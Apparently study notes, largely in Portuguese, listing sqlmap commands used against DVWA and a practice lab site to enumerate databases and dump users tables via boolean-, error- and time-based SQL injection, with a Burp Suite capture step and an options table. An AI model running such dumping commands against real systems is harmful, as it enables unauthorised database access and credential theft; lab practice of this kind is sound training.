# Exemplos
```shell
sqlmap -r dvwa_request.txt --batch --dbs --cookie="security=low; PHPSESSID=tvag3q21u5eii5v6hvuv4b6ohb"
```

```shell
sqlmap -r dvwa_request.txt -D dvwa -T users --dump
```

# Exemplos 2

## Explorar a página de Login
```shell
sqlmap -r request.raw --dbs
```

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/post-login/" --batch --dbs --dump
```

### Find the Passwords
```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/find-password/?search=teste" --risk=3 --level=5 --batch
```

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/find-password/?search=teste" --dbs --batch
```
```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/find-password/?search=teste" -D sql_injection --tables --batch
```

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/find-password/?search=teste" -D sql_injection -T users --dump --batch
```

### Boolean-Based Blind SQL Injection
```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/post-blind-boolean/" --method=POST --data="search=iphone11" --cookie="PHPSESSID=lr82fhkublhch289n629r30k4c" --batch --level=5 --risk=3
```

### Error-Based Blind SQL Injection

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/get-blind-error/index.php?img=1" --cookie="PHPSESSID=lr82fhkublhch289n629r30k4c" --batch --dbs
```

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/get-blind-error/index.php?img=1" -D sql_injection --cookie="PHPSESSID=lr82fhkublhch289n629r30k4c" --batch --tables
```

```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/get-blind-error/index.php?img=1" -D sql_injection -T users --cookie="PHPSESSID=lr82fhkublhch289n629r30k4c" --batch --dump
```


### Time-Based Blind SQL Injection
```shell
sqlmap -u "https://lzwdgttvhlknjbblqadq.tiagocardoso.xyz/lab/sql-injection/post-blind-time/" --method=POST --data="email=teste%40gmail.com" --cookie="PHPSESSID=lr82fhkublhch289n629r30k4c" --batch --level=5 --risk=3
```




Abra o Burp Suite e configure o navegador para usar o proxy do Burp (normalmente, localhost:8080). Vá até a página de “SQL Injection” no DVWA. Insira, por exemplo, o valor 1 no campo de ID e envie. No Burp Suite, na aba “Proxy” > “HTTP history”, localize a requisição referente ao envio do ID. Clique com o botão direito e selecione “Copy to file” ou “Copy as curl command”.
# Sqlmap Commands
To show the basic help menu, simply type `sqlmap -h` in the terminal.

## **Basic** commands:  

|   |   |
|---|---|
|**Options**|**Description**|
|-u URL, --url=URL|Target URL (e.g. "http://www.site.com/vuln.php?id=1")|
|--data=DATA|Data string to be sent through POST (e.g. "id=1")|
|--random-agent|Use randomly selected HTTP User-Agent header value|
|-p TESTPARAMETER|Testable parameter(s)|
|--level=LEVEL|Level of tests to perform (1-5, default 1)|
|--risk=RISK|Risk of tests to perform (1-3, default 1)|

